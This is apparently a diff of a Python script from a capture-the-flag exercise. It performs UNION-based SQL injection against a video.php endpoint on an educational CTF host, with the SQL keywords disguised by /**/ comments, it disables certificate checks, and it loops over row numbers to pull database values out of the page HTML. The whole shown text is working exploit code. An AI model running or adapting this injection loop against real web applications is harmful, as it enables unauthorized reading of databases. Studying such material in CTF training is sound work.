@@ -3,20 +3,22 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/1,user,null/**/from/**/dual/**/where/**/rownum/**/=/**/'
-
+# url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/all/**/select/**/1,user,null/**/from/**/dual/**/where/**/rownum/**/=/**/'
+url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,DUMMY,null/**/from/**/sys.dual/**/where/**/rownum='
 for row_num in range(1, 1000):
 
     url2 = url + str(row_num)
-
     result = requests.get(url2, verify=False)
+
     if 'Error' not in result.text and 'Bad cat!' not in result.text:
 
         splittext = result.text.splitlines()
         for each_row in splittext:
-            if '<h2>' in each_row and len(each_row) > 13:
+            if '<h2>' in each_row: # and len(each_row) > 13:
+                print(len(each_row))
                 print(each_row)
                 print('url now %s'%(url2))
+
 
 '''
 for first in ['null', '1', '%27a%27', '%22a%22' ]:
